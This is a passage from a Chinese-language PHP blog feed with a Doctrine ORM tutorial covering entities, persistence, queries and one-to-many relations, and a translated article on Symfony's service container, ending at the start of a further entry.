<h2 id="2-Doctrine"><a href="#2-Doctrine" class="headerlink" title="2.Doctrine"></a>2.Doctrine</h2><p>doctrine是symfony框架默认ORM，下面我就简单介绍一下，官网连接: <a href="https://www.doctrine-project.org/" target="_blank" rel="noopener">https://www.doctrine-project.org/</a> </p>
<h3 id="一-安装"><a href="#一-安装" class="headerlink" title="一.安装"></a>一.安装</h3><p>按照官方的教程，最好的方式是使用composer:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"require"</span>: &#123;</span><br><span class="line">        <span class="attr">"doctrine/orm"</span>: <span class="string">"^2.6.2"</span>,</span><br><span class="line">        <span class="attr">"symfony/yaml"</span>: <span class="string">"2.*"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二-在项目根目录创建一个bootstrap-php文件："><a href="#二-在项目根目录创建一个bootstrap-php文件：" class="headerlink" title="二.在项目根目录创建一个bootstrap.php文件："></a>二.在项目根目录创建一个bootstrap.php文件：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// bootstrap.php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Doctrine</span>\<span class="title">ORM</span>\<span class="title">Tools</span>\<span class="title">Setup</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Doctrine</span>\<span class="title">ORM</span>\<span class="title">EntityManager</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a simple "default" Doctrine ORM configuration for Annotations</span></span><br><span class="line">$isDevMode = <span class="keyword">true</span>;</span><br><span class="line">$config = Setup::createAnnotationMetadataConfiguration(<span class="keyword">array</span>(<span class="keyword">__DIR__</span>.<span class="string">"/src"</span>), $isDevMode);</span><br><span class="line"><span class="comment">// or if you prefer yaml or XML</span></span><br><span class="line"><span class="comment">//$config = Setup::createXMLMetadataConfiguration(array(__DIR__."/config/xml"), $isDevMode);</span></span><br><span class="line"><span class="comment">//$config = Setup::createYAMLMetadataConfiguration(array(__DIR__."/config/yaml"), $isDevMode);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// database configuration parameters</span></span><br><span class="line">$conn = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'dbname'</span> =&gt; <span class="string">'blog'</span>,</span><br><span class="line">    <span class="string">'user'</span> =&gt; <span class="string">'root'</span>,</span><br><span class="line">    <span class="string">'password'</span> =&gt; <span class="string">'123456'</span>,</span><br><span class="line">    <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">    <span class="string">'driver'</span> =&gt; <span class="string">'pdo_mysql'</span>,</span><br><span class="line">    <span class="string">'charset'</span> =&gt; <span class="string">'utf8'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">// obtaining the entity manager</span></span><br><span class="line">$entityManager = EntityManager::create($conn, $config);</span><br></pre></td></tr></table></figure>
<p>这里面有一些需要注意的地方，$idDevMode是配置是否开发模式.</p>
<p>$config按照官方说法现在推荐使用 Annotation 也就说注解的方式配置，还支持xml和yaml，但是yaml这种方式已经被deprecated了，还有需要把src替换成你自己项目的目录，在本例中，是app。</p>
<p>下面还有数据库连接配置，官方给的案例是使用了sqlite，这里我改成了MySQL。</p>
<h3 id="三-配置命令行工具"><a href="#三-配置命令行工具" class="headerlink" title="三.配置命令行工具"></a>三.配置命令行工具</h3><p>同样在项目根目录新建一个 cli-config.php 文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// cli-config.php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"bootstrap.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> \Doctrine\ORM\Tools\Console\ConsoleRunner::createHelperSet($entityManager);</span><br></pre></td></tr></table></figure>
<p>这样就可以使用命令行工具执行一些操作，比如说生成数据表，更新数据表</p>
<h3 id="四-定义数据库实体，创建数据表"><a href="#四-定义数据库实体，创建数据表" class="headerlink" title="四.定义数据库实体，创建数据表"></a>四.定义数据库实体，创建数据表</h3><p>先来一个简单的，在app目录下创建一个 Product.php 文件，这个文件其实可以理解为是model，即数据库模型文件！内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Entity</span> <span class="doctag">@Table</span>(name="products",options=&#123;"collate"="utf8mb4_unicode_ci", "charset"="utf8mb4"&#125;)</span></span><br><span class="line"><span class="comment"> * Class Product</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@ID</span> <span class="doctag">@Column</span>(type="integer") <span class="doctag">@GenerateDValue</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Column</span>(type="string")</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ......more code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后面的setter和getter这里省略了，如果有人对 <strong>annotation</strong> 这种注解方法比较熟悉的话应该可以看懂上面那些注释的意思。</p>
<p>首先在类的注释上，使用了@Entity表明这是一个数据库实体。@Table指定了表名，@ID表明的是主键，@Column表明是数据表字段，使用type声明了类型！</p>
<p>然后使用命令<code>vendor/bin/doctrine orm:schema-tool:update --force --dump-sql</code>就可以生成数据表：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">The following SQL statements will be executed:</span><br><span class="line"></span><br><span class="line">    CREATE TABLE products (id INT NOT NULL, name VARCHAR(255) NOT NULL, PRIMARY KEY(id)) DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci ENGINE = InnoDB;</span><br><span class="line"></span><br><span class="line">Updating database schema...</span><br><span class="line"></span><br><span class="line">    1 query was executed</span><br><span class="line">                                                                                                     </span><br><span class="line">[OK] Database schema updated successfully!</span><br></pre></td></tr></table></figure>
<p>使用这种方式建表不用去写SQL语句，无论是mysql还是sql server，或者oracle，都没问题，一键迁移，ORM抹平了数据库之间的差异！</p>
<h3 id="五-持久化数据到数据表"><a href="#五-持久化数据到数据表" class="headerlink" title="五.持久化数据到数据表"></a>五.持久化数据到数据表</h3><p>上面的步骤搞定了数据表创建的问题，下面来介绍一下如何插入数据到数据表，为了方便，这里我直接写在index.php里面：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"vendor/autoload.php"</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">"bootstrap.php"</span>;</span><br><span class="line"></span><br><span class="line">$product = <span class="keyword">new</span> \App\Product();</span><br><span class="line">$product-&gt;setName(<span class="string">"ORM的应用"</span>);</span><br><span class="line"></span><br><span class="line">$entityManager-&gt;persist($product);</span><br><span class="line">$entityManager-&gt;flush();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Created Product Success with ID: "</span>.$product-&gt;getId();</span><br><span class="line">var_dump($product);</span><br></pre></td></tr></table></figure>
<p>可以看出来这是一个完全OOP的写法，是先实例化一个数据表实体，然后通过setter去设置去属性，最后调用persist和flush持久化数据库里面。</p>
<h3 id="六-查询数据"><a href="#六-查询数据" class="headerlink" title="六.查询数据"></a>六.查询数据</h3><p>使用ORM查询数据也很简单,：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//查询所有</span></span><br><span class="line">$productRepository = $entityManager-&gt;getRepository(<span class="string">'\App\Product'</span>);</span><br><span class="line">$products = $productRepository-&gt;findAll();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($products <span class="keyword">as</span> $product) &#123;</span><br><span class="line">    var_dump($product);</span><br><span class="line">    var_dump($product-&gt;getName());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询单个</span></span><br><span class="line">$id = <span class="number">3</span>;</span><br><span class="line">$product = $entityManager-&gt;find(<span class="string">'Product'</span>, $id);</span><br><span class="line"><span class="keyword">if</span> ($product === <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"No product found.\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">var_dump($product);</span><br></pre></td></tr></table></figure>
<p>如果想对数据进行修改也很简单，比如在上面的例子里面，我们查询出id为3的数据，现在我们想修改这条数据:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$product-&gt;setName(<span class="string">"ORM更新数据"</span>);</span><br><span class="line">$entityManager-&gt;flush();</span><br></pre></td></tr></table></figure>
<p>我们只需调用这个对象的setter方法，然后flush即可！</p>
<h3 id="七-表与表之间的关系"><a href="#七-表与表之间的关系" class="headerlink" title="七.表与表之间的关系"></a>七.表与表之间的关系</h3><p>数据表和数据表之间的关系总体来说可以分为下面几种：1对1，1对多，多对多，在doctrine里面有细分为下面几种：</p>
<img src = "/images/old/5f6e3e27ly1fx6n9nprvzj208n09raab.jpg" />

<p>划分的有点复杂和难理解，这里我就简单介绍其中一种：oneToMany，即1对多关系，这个其实很常见，比如说一个产品可以有多个评论。</p>
<p>从面向对象的思维来说，2个表之间的关系就是2个对象之间的关系，所谓1对多，其实1个对象包含（hasMany）多个其它对象, 在实际数据表设计，为了表达这种关系，也有好几种设计方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一种: 在 product 表新增一个字段 comment_ids，用于存放所有评论ID，这种方式查询评论的时候简单，但是一旦要修改数据就头疼了，很少使用。</span><br><span class="line"></span><br><span class="line">第二种: 在 comment 表新增一个product_id，用于表明当前评论所属的product，查询的时候稍微复杂点，但是便于修改数据。</span><br><span class="line"></span><br><span class="line">第三种: 新建一个中间表，用来维护2个表之间的关系，中间表一般用来维护多对多的关系，但是也可以用于1对多的关系，这时候查询和修改都比较复杂，好处就是很容易扩展成多对多关系！</span><br></pre></td></tr></table></figure>
<p>实际开发中，大部分时候都是使用第二种方式来表示1对多的关系。在doctrine里面，对于1对多，有3种形式：</p>
<p>1.双向（bidirectional），这个其实就是对应上面第二种的方式</p>
<p>2.单向结合中间表（Unidirectional with Join Table），这个就是对应上面所说的第三种的方式</p>
<p>3.自引用（Self-referencing)，这个所谓的自引用，其实就是指类似在无限级分类表设计，有一个parent_id字段指向表本身的记录！</p>
<p>这里我就演示一下第二种方式，通过在 comment 表新建 product_id 字段这种方式。</p>
<p>首先，先定义一下评论实体comment, 基本结构和product差不多：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Entity</span> <span class="doctag">@Table</span>(name="comments",options=&#123;"collate"="utf8mb4_unicode_ci", "charset"="utf8mb4"&#125;)</span></span><br><span class="line"><span class="comment"> * Class Product</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这里通过注释设置了需要映射的实体和对应的字段</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@ManyToOne</span>(targetEntity="Product", inversedBy="comments")</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@JoinColumn</span>(name="product_id", referenceColumnName="id")</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Product</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $product;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Product</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getProduct</span><span class="params">()</span>: <span class="title">Product</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;product;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Product $product</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> self</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setProduct</span><span class="params">(Product $product)</span>: <span class="title">self</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;product = $product;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@ID</span> <span class="doctag">@Column</span>(type="integer") <span class="doctag">@GenerateDValue</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Column</span>(type="string")</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line">    </span><br><span class="line">    .......more code</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line">但是多了一个属性 product, 因为这种<span class="number">1</span>对多的关系对评论来说就是一个评论拥有一个产品，但是一个产品可以拥有多个评论。</span><br><span class="line"></span><br><span class="line">同理，我们就需要对 product 实体做一些改动，加入了一个comments属性和一些注解！</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@oneToMany</span>(targetEntity="Comment", mappedBy="product")</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $comments;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;comments = <span class="keyword">new</span> ArrayCollection();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">....more code</span><br></pre></td></tr></table></figure>
<p>执行 <code>vendor/bin/doctrine orm:schema-tool:update --force --dump-sql</code>更新数据库, 执行之后你会发现comments表会多一个product_id字段, 同时还会多出一个外键索引！</p>
<p>经过改造之后，现在如果我们需要给一个产品增加一条评论改怎么操作呢？举个例子，我们现在需要给id为3的这个产品增加一条评论，操作如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = <span class="number">3</span>;</span><br><span class="line">$product = $entityManager-&gt;find(<span class="string">'\App\Product'</span>, $id);</span><br><span class="line"></span><br><span class="line">$comment = <span class="keyword">new</span> \App\Comment();</span><br><span class="line">$comment-&gt;setContent(<span class="string">"这是一条评论！"</span>);</span><br><span class="line">$comment-&gt;setProduct($product);</span><br><span class="line"></span><br><span class="line">$entityManager-&gt;persist($comment);</span><br><span class="line">$entityManager-&gt;flush();</span><br></pre></td></tr></table></figure>
<p>执行以上代码，查看数据表你会发现comments表会自动增加一条记录，其product_id为3，在代码里面我们并没有手动去设置product_id，ORM替我们自动完成了这些操作！</p>
<p>下面再看查询一个产品的所有评论，操作也是相当简单的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = <span class="number">3</span>;</span><br><span class="line">$product = $entityManager-&gt;find(<span class="string">'\App\Product'</span>, $id);</span><br><span class="line">$comments = $product-&gt;getComments()-&gt;toArray();</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><p>ORM试图把数据表之间的关系抽象成数据模型对象之间的关系，让开发人员少拼SQL，以更面向对象的方式开发，更加专注业务模型，有好处但是也有很多问题！</p>
<p>1.在doctrine这个ORM里面，表与表之间的关系是有物理外键索引的，这对于web项目来说并不是优势，虽然外键有利于保证数据安全和完整，但是大大影响了数据库插入速度！而现在大多数web项目都强调高并发，数据库往往都是瓶颈，<br>物理外键只适合一些对数据安全性和完整性要求非常高的项目，比如OA，企业SasS，或金融相关！但是在 Eloquent ORM 里面，数据表是没有物理外键的，表与表的之间关系是在模型层维护的。</p>
<p>2.比较占内存，ORM为了实现这些功能，在内存里面维护了很多对象，有很多额外处理逻辑，查询速度相比你直接运行原生sql慢一点</p>
<p>3.不利于优化SQL语句，虽然ORM最终也是生成sql去执行，但是其sql语句很多时候是不可控的，如果需要优化起来就很麻烦，无法针对每一条sql做优化！如果模型关系非常复杂的话就更难优化了！</p>
<p>以前参与了一个基于symfony框架的云采购系统的开发，symfony本身就是一个非常重量级的PHP框架，有人戏称用起来和某些Java框架一样，虽然其很多理念非常不错，但是PHP毕竟是脚本语言，并没有jvm的buff加持，导致项目做大了以后，速度非常慢（一个页面大概要1s多），也很占内存（最低2G内存），不过作为一个2b（面向企业）的系统来说，这点还可以接受，毕竟用户不多。</p>
<p>对于很多用户量巨大的web项目来说，数据库可能还有分库分表、读写分离等操作，使用ORM就可能会有很多问题要去解决了，直接拼SQL虽然难看了点，麻烦了点，但是可控性比较高！大家怎么看呢？</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>ORM</tag>
      </tags>
  </entry>
  <entry>
    <title>三、Symfony服务容器介绍</title>
    <url>/2017/coding/php/php-di-symfony.html</url>
    <content><![CDATA[<blockquote>
<p>此文是本人翻译的来自国外某网站一篇文章 <a href="https://fabien.potencier.org/do-you-need-a-dependency-injection-container.html" target="_blank" rel="noopener">Do you need a Dependency Injection Container?</a></p>
</blockquote>
<blockquote>
<p>这篇文章是一系列关于依赖注入和PHP轻量级容器实现文章中的一部分：<br><a href="https://fabien.potencier.org/article/11/what-is-dependency-injection" target="_blank" rel="noopener">Part 1: What is Dependency Injection?</a><br><a href="https://fabien.potencier.org/article/12/do-you-need-a-dependency-injection-container" target="_blank" rel="noopener">Part 2: Do you need a Dependency Injection Container?</a><br><a href="https://fabien.potencier.org/article/13/introduction-to-the-symfony-service-container" target="_blank" rel="noopener">Part 3: Introduction to the Symfony Service Container</a><br><a href="https://fabien.potencier.org/article/14/symfony-service-container-using-a-builder-to-create-services" target="_blank" rel="noopener">Part 4: Symfony Service Container: Using a Builder to create Services</a><br><a href="https://fabien.potencier.org/article/15/symfony-service-container-using-xml-or-yaml-to-describe-services" target="_blank" rel="noopener">Part 5: Symfony Service Container: Using XML or YAML to describe Services</a><br><a href="https://fabien.potencier.org/article/16/symfony-service-container-the-need-for-speed" target="_blank" rel="noopener">Part 6: The Need for Speed</a></p>
</blockquote>
<p>在依赖注入这系列文章里，之前我们已经谈过一些基本思想。前面2篇文章介绍的东西对于更好的理解我们接下来文章要说的非常重要，现在是时候了解Symfony2里面服务容器的实现了。<br>Symfony里面依赖注入容器是被一个叫sfServiceContainer的类管理的，这是一个非常轻的类，它实现了我们上篇文章里面说到的基本特性。<br>在Symfony里面，一个服务就是一个被容器管理的对象。在上一篇文章Zend_Mail例子里，我们有2个：mailer服务和mail_transport服务：</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Container</span><br><span class="line">&#123;</span><br><span class="line">  static protected $shared &#x3D; array();</span><br><span class="line"></span><br><span class="line">  protected $parameters &#x3D; array();</span><br><span class="line"></span><br><span class="line">  public function __construct(array $parameters &#x3D; array())</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;parameters &#x3D; $parameters;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function getMailTransport()</span><br><span class="line">  &#123;</span><br><span class="line">    return new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array(</span><br><span class="line">      &#39;auth&#39;     &#x3D;&gt; &#39;login&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; $this-&gt;parameters[&#39;mailer.username&#39;],</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; $this-&gt;parameters[&#39;mailer.password&#39;],</span><br><span class="line">      &#39;ssl&#39;      &#x3D;&gt; &#39;ssl&#39;,</span><br><span class="line">      &#39;port&#39;     &#x3D;&gt; 465,</span><br><span class="line">    ));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function getMailer()</span><br><span class="line">  &#123;</span><br><span class="line">    if (isset(self::$shared[&#39;mailer&#39;]))</span><br><span class="line">    &#123;</span><br><span class="line">      return self::$shared[&#39;mailer&#39;];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $class &#x3D; $this-&gt;parameters[&#39;mailer.class&#39;];</span><br><span class="line"></span><br><span class="line">    $mailer &#x3D; new $class();</span><br><span class="line">    $mailer-&gt;setDefaultTransport($this-&gt;getMailTransport());</span><br><span class="line"></span><br><span class="line">    return self::$shared[&#39;mailer&#39;] &#x3D; $mailer;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们让Container类继承sfServiceContainer类，就可以简化一下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Container extends sfServiceContainer</span><br><span class="line">&#123;</span><br><span class="line">  static protected $shared &#x3D; array();</span><br><span class="line"></span><br><span class="line">  protected function getMailTransportService()</span><br><span class="line">  &#123;</span><br><span class="line">    return new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array(</span><br><span class="line">      &#39;auth&#39;     &#x3D;&gt; &#39;login&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; $this[&#39;mailer.username&#39;],</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; $this[&#39;mailer.password&#39;],</span><br><span class="line">      &#39;ssl&#39;      &#x3D;&gt; &#39;ssl&#39;,</span><br><span class="line">      &#39;port&#39;     &#x3D;&gt; 465,</span><br><span class="line">    ));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  protected function getMailerService()</span><br><span class="line">  &#123;</span><br><span class="line">    if (isset(self::$shared[&#39;mailer&#39;]))</span><br><span class="line">    &#123;</span><br><span class="line">      return self::$shared[&#39;mailer&#39;];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $class &#x3D; $this[&#39;mailer.class&#39;];</span><br><span class="line"></span><br><span class="line">    $mailer &#x3D; new $class();</span><br><span class="line">    $mailer-&gt;setDefaultTransport($this-&gt;getMailTransportService());</span><br><span class="line"></span><br><span class="line">    return self::$shared[&#39;mailer&#39;] &#x3D; $mailer;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这还不够，但是这会给我们一个稍微强大和干净的接口。我们做了以下改变：</p>
<ul>
<li>所有的方法名都以Service为后缀.为了方便，一个服务名字必须以get开始，Service结束，每一个服务都有一个唯一的标识符。通过定义一个getMailTransportService()方法，我们就相当于定义了一个名叫mail_transport的服务。</li>
<li>所有方法都是protected.我们待会就会知道如何从容器取得一个服务了</li>
<li>容器可以通过数组来获取参数值 ($this[‘mailer.class’])</li>
</ul>
<p>让我们看看如何使用新的容器类：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require_once &#39;PATH&#x2F;TO&#x2F;sf&#x2F;lib&#x2F;sfServiceContainerAutoloader.php&#39;;</span><br><span class="line">sfServiceContainerAutoloader::register();</span><br><span class="line"></span><br><span class="line">$sc &#x3D; new Container(array(</span><br><span class="line">  &#39;mailer.username&#39; &#x3D;&gt; &#39;foo&#39;,</span><br><span class="line">  &#39;mailer.password&#39; &#x3D;&gt; &#39;bar&#39;,</span><br><span class="line">  &#39;mailer.class&#39;    &#x3D;&gt; &#39;Zend_Mail&#39;,</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$mailer &#x3D; $sc-&gt;mailer;</span><br></pre></td></tr></table></figure>
<p>现在，因为Container类已经继承了sfServiceContainer类，接口就清晰多了：</p>
<ul>
<li>服务可以通过统一的接口获取：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ($sc-&gt;hasService(&#39;mailer&#39;))</span><br><span class="line">&#123;</span><br><span class="line">  $mailer &#x3D; $sc-&gt;getService(&#39;mailer&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sc-&gt;setService(&#39;mailer&#39;, $mailer);</span><br></pre></td></tr></table></figure></li>
<li>作为捷径，服务也可以通过属性符号获取<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($sc-&gt;mailer))</span><br><span class="line"> &#123;</span><br><span class="line">   $mailer &#x3D; $sc-&gt;mailer;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> $sc-&gt;mailer &#x3D; $mailer;</span><br></pre></td></tr></table></figure></li>
<li>参数也可以通过统一的接口获取<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!$sc-&gt;hasParameter(&#39;mailer_class&#39;))</span><br><span class="line">   &#123;</span><br><span class="line">     $sc-&gt;setParameter(&#39;mailer_class&#39;, &#39;Zend_Mail&#39;);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   echo $sc-&gt;getParameter(&#39;mailer_class&#39;);</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; Override all parameters of the container</span><br><span class="line">   $sc-&gt;setParameters($parameters);</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; Adds parameters</span><br><span class="line">   $sc-&gt;addParameters($parameters);</span><br></pre></td></tr></table></figure></li>
<li>作为捷径，参数也可以通过数组获取<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!isset($sc[&#39;mailer.class&#39;]))</span><br><span class="line">   &#123;</span><br><span class="line">     $sc[&#39;mailer.class&#39;] &#x3D; &#39;Zend_Mail&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $mailerClass &#x3D; $sc[&#39;mailer.class&#39;];</span><br></pre></td></tr></table></figure></li>
<li>你还可以迭代获取容器里面的所有服务<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach ($sc as $id &#x3D;&gt; $service)</span><br><span class="line">  &#123;</span><br><span class="line">    echo sprintf(&quot;Service %s is an instance of %s.\n&quot;, $id, get_class($service));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>当你有少量服务需要管理的话使用sfServiceContainer类非常有用方便，即使这样你还得做很多基础工作。如果你需要管理的服务增长到一定数量级，我们就需要一种更好的方式。</p>
<p>这也就是为什么大多数时候你并不需要直接使用sfServiceContainer类，但是它作为Symfony依赖注入容器实现的基石，我们还是需要花一些时间去描述它。</p>
<p>在下一篇文章里面，我们会看一下sfServiceContainerBuilder类，它简化了服务定义的过程。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>依赖注入</tag>
      </tags>
  </entry>
  <entry>
    <title>二、你需要一个依赖注入容器吗？</title>
    <url>/2017/coding/php/php-di-need.html</url>
    <content><![CDATA[<blockquote>
<p>此文是本人翻译的来自国外某网站一篇文章 <a href="https://fabien.potencier.org/do-you-need-a-dependency-injection-container.html" target="_blank" rel="noopener">Do you need a Dependency Injection Container?</a></p>
</blockquote>
<blockquote>
